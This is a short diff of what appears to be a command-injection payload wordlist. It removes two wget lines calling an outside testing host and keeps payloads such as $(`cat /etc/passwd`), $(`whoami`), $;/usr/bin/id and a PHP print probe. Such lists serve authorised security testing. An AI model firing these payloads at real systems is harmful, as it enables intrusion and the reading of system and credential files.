@@ -346,8 +346,6 @@ $(`cat /etc/passwd`)
 $(`dir`)
 $(`ls`)
 $(`type C:\boot.ini`)
-$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
-$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
 $(`whoami`)
 $;/usr/bin/id
 ${@print("RCEVulnerable")}
